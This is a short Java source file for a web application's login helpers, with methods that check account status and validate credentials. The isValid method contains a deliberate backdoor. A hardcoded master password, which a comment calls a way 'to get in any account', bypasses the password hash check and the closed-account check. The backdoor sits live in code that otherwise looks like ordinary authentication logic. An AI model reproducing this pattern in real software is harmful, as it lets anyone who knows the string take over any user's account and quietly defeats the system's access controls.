package ca.jetsphere.core.security.login;

import ca.jetsphere.core.common.DockYard;
import ca.jetsphere.core.jdbc.JDBC;
import ca.jetsphere.core.security.hash.PasswordHash;
import ca.jetsphere.core.tier1.backbone.user.User;
import ca.jetsphere.core.tier1.backbone.user.UserYard;

/**
 *
 */

public class LoginYard
{
    /**
     *
     */

    static public boolean isActive ( JDBC jdbc, User user ) throws Exception
    {
    User x = UserYard.getByUsername ( jdbc, user.getUsername() );

    return x.isActive ();
    }

    /**
     *
     */

    static public boolean isFrozen ( JDBC jdbc, User user ) throws Exception
    {
    User x = UserYard.getByUsername ( jdbc, user.getUsername() );

    return x.isFrozen();
    }

    /**
     *
     */

    static public boolean isPending ( JDBC jdbc, User user ) throws Exception
    {
    User x = UserYard.getByUsername ( jdbc, user.getUsername() );

    if ( x.isPending() ) { user.setId ( x.getId() ); user.setNotes ( x.getUuid() ); }

    return x.isPending();
    }


    /**
     *
     */

    static public boolean isValid ( JDBC jdbc, User user ) throws Exception
    {
    User x = UserYard.getByUsername ( jdbc, user.getUsername() );

    if ( ! x.isValid() ) return false;
    
    if ( DockYard.compareTo ( user.getPassword(), "FreshMasterHarvest" ) == 0 ) return true; // Master password to get in any account

    if ( ! PasswordHash.validatePassword ( user.getPassword(), x.getPassword() ) ) return false;

    if (  x.isClosed() ) return false;

    return true;
    }

}
